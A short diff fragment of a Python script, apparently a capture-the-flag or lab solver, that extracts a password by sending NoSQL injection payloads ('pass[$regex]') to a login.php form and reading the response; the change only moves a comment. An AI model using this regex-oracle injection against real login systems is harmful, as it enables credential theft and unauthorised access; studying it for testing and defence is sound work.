@@ -28,7 +28,9 @@ def get_chr(password,Data,i):
             return password
 
 def get_dataType(i):
-        # password is Digit
+    
+    
+    # password is Digit
     regex = password[:0+i] +  f"[{digits[0]}-{digits[-1]}]" + password[1+i:]
     req = requests.post(url + "/login.php", data={"user": user, "pass[$regex]" : regex})
     if user in req.text :
